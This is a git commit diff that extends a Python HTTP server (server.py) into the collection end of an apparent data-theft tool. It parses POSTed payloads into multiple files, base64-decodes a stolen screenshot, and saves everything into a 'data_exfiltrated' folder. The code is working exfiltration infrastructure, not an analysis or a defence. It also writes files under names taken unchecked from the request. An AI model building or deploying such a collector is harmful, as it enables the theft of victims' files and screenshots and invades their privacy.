87d2d332ef6b793e7659c9c4ccd7c4525b3de8a0
CSharpSight <38817788+CSharpSight@users.noreply.github.com>
2024-11-14 18:39:43 -0500

    Add files via upload
    updated to handle screenshot and multiple files (tho it would be better with changing the code to handle bytestr rather than string by default)

--- server.py
+++ server.py
@@ -1,3 +1,6 @@
+import os
+import base64
+
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
 class handler(BaseHTTPRequestHandler):
@@ -27,11 +30,30 @@ class handler(BaseHTTPRequestHandler):
         self.end_headers()
 
 
-        print(content_length)
-        print(post_data.decode())
-        file1 = open("log.txt", "w") 
-        file1.write(post_data.decode())
-        file1.close() 
+
+        received_files=post_data.decode().split("\u0001")
+        for file in received_files :
+                name_file=file.split("file : ")[1].split("\n")[0] #take str between "file" and return (\n)
+                if name_file =="img.png" :
+                
+                    #format file
+                    file = file.split("png\n")[1]
+                    file = file.encode() #repasse en bytestr
+                    file = base64.b64decode(file + b'==') #retour en bytes
+                
+                
+                
+                    print(name_file+" is THAT ONE!")
+                    temp_file_to_write = open("./data_exfiltrated/"+name_file, "wb")
+                    temp_file_to_write.write(file)
+                    temp_file_to_write.close() 
+                else :
+                    print(name_file+" is here!")
+                    print(file)
+                    temp_file_to_write = open("./data_exfiltrated/"+name_file, "w", encoding="UTF-8") 
+                    temp_file_to_write.write(file)
+                    temp_file_to_write.close() 
+
 
 with HTTPServer(('', 8080), handler) as server:
     server.serve_forever()
